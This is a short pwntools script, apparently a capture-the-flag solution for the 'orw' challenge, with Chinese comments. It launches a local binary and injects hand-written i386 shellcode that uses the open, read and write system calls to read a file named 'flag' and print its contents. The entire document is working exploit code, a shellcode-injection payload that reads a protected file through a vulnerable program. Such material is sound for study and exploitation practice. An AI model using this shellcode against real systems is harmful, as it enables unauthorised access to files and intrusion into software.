#-*- coding:utf8 -*-
from pwn import *
context(os = 'linux', arch = 'i386', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./orw')

code = asm('''
        /* open */
        push 0
        push 0x67616c66
        mov ebx, esp /* 第一个参数的地址 */
        xor ecx, ecx
        xor edx, edx 
        mov eax, 5 /* 系统调用号 */
        int 0x80

        /* read */
        mov ebx, eax /* 文件描述符 */
        mov ecx, 0x0804a050 /* 写入数据的内存地址 */
        mov edx, 0x20 /* 读取数据的长度 */
        mov eax, 0x3 /* 系统调用号 */
        int 0x80

        /* write */
        mov ebx, 1 /* 文件描述符 */
        mov ecx, 0x0804a050 /* flag地址 */
        mov edx, 0x20 /* 打印的数据长度 */
        mov eax, 0x4 /* 系统调用号 */
        int 0x80
        
''', arch = 'i386', os = 'linux')

#gdb.attach(p, 'b * 0x0804858a\nc\nsi')
p.sendafter("shellcode:", code + '\x00')


p.interactive()
